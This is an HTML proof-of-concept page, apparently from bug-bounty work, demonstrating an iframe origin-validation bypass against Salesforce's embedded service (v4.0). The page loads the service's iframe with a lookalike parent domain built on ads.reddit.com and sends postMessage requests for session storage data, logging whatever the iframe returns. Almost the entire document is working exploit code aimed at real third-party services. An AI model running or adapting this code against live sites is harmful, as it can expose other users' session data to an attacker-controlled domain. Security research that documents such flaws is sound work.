<!DOCTYPE html>
<html>
  <head>
    <title>Salesforce 4.0 Origin Bypass PoC</title>
    <style>
      body { font-family: sans-serif; padding: 1rem; }
      iframe { width: 600px; height: 400px; border: 1px solid #ccc; }
    </style>
  </head>
  <body>
    <h3>Salesforce Iframe Origin Bypass PoC (v4.0)</h3>
    <p>Check console for iframe responses.</p>

    <iframe
      id="sf-iframe"
      name="https://ads.reddit.com"
      src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://ads.reddit.com.wangdubruh.xyz"
    ></iframe>

    <script>
      const iframe = document.getElementById("sf-iframe");

      iframe.onload = () => {
        console.log("[+] Iframe loaded (v4.0)");

        // Send test messages
        setTimeout(() => {
          const testMessages = [
            {
              method: "getSessionStorageData",
              domain: "ads.reddit.com",
              deploymentId: "test123"
            },
            {
              method: "session.updateStorage",
              domain: "ads.reddit.com",
              data: {
                deploymentId: "test123",
                isSamePageNavigation: true,
                isRefresh: false
              }
            }
          ];

          testMessages.forEach((msg, i) => {
            console.log(`[ðŸ“¤] Sending message ${i + 1}:`, msg);
            iframe.contentWindow.postMessage(msg, "*");
          });
        }, 1000);
      };

      // Log iframe replies
      window.addEventListener("message", (event) => {
        console.log("[ðŸ“©] Message from iframe:", event.data);
      });
    </script>
  </body>
</html>
